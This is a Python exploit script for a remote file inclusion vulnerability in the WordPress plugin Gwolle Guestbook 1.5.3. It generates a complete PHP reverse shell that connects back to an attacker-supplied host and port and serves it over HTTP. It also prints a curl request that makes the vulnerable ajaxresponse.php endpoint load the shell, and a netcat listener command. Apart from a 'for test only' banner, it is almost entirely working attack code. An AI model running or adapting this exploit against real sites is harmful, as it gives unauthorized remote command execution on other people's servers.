#!/usr/bin/python3

import os
import subprocess
import sys
import http.server
import socketserver

class bcolors:

    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'


def usage():

    message = f"usage: {sys.argv[0]} <Target_URL> <Attackers_Host> <Attackers_Port>"
    example = f"example: {sys.argv[0]} http://vuln.com 192.168.0.4 1234"

    print(message) 
    print(example)
    
    del message, example


def init():
    
    banner = """
                     .__  .__             ___.                   __
   ______  _  ______ |  | |  |   ____     \_ |__  __ __  _______/  |_  ___________
  / ___\ \/ \/ /  _ \|  | |  | _/ __ \     | __ \|  |  \/  ___/\   __\/ __ \_  __ '
 / /_/  >     (  <_> )  |_|  |_\  ___/     | \_\ \  |  /\___ \  |  | \  ___/|  | \/
 \___  / \/\_/ \____/|____/____/\___  >____|___  /____//____  > |__|  \___  >__|
/_____/                             \/_____/   \/           \/            \/

            +--------------------------------------------------------+
            | WordPress old plugin gwolle 1.5.3 RemoteFileInclusion  |
            | For test only, Do not use this for illegal_activity    |
            +--------------------------------------------------------+
    """
    print(bcolors.GREEN)
    print(banner)

    if len(sys.argv) != 4:
        print(bcolors.RED)
        print("[!]Need Arguments for execute")
        print(bcolors.YELLOW)
        usage()    
        print(bcolors.ENDC)
        sys.exit()
    
    target = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]
    print(bcolors.ENDC)
    return target,lhost,lport

def php_write(lhost,lport):

    file_name = "wp-load.php"
    f = open(file_name,"w")


    raw = """

    <?php
    set_time_limit (0);
    $VERSION = "1.0";
    $ip = '{lhost}';
    $port = {lport};
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;

    if (function_exists('pcntl_fork')) {

	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
    } else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
    }

    chdir("/");

    umask(0);


    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
    }

    $descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
    );

    $process = proc_open($shell, $descriptorspec, $pipes);

    if (!is_resource($process)) {
    	printit("ERROR: Can't spawn shell");
	exit(1);
    }

    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);

    printit("Successfully opened reverse shell to $ip:$port");

    while (1) {
    	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
    }

    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);

    function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
    }

    ?>

    """
    
    raw = raw.replace("{lhost}",lhost)
    raw = raw.replace("{lport}",lport)

    f.write(raw)
    

    f.close()

    del f

    return file_name


def server_up(curl_cmd):
    
    

    print("Copy this command and execute at other new terminal")
    print(curl_cmd)

    PORT = 8000

    Handler = http.server.SimpleHTTPRequestHandler

    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("serving at port", PORT)
        httpd.serve_forever()
        
	print("-----------------------------------------------------------------------------------")
        print("Copy this command and execute at other new terminal")
        print(curl_cmd)
	print("-----------------------------------------------------------------------------------")
        

def main(target,lhost,lport):
    
    request_url = target + "/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://"+lhost+":8000/"
    curl_cmd = f"curl -v -s {request_url}"
    netcat_cmd = f"nc -nlvp {lport}"
    
    print("-----------------------------------------------------------------------------------")
    print("Open other terminal and copy this")
    print(netcat_cmd)
    print("-----------------------------------------------------------------------------------")
        
    return curl_cmd


if __name__ == "__main__":
    target,lhost,lport = init()
    php_write(lhost,lport)
    curl_cmd = main(target,lhost,lport)
    server_up(curl_cmd)
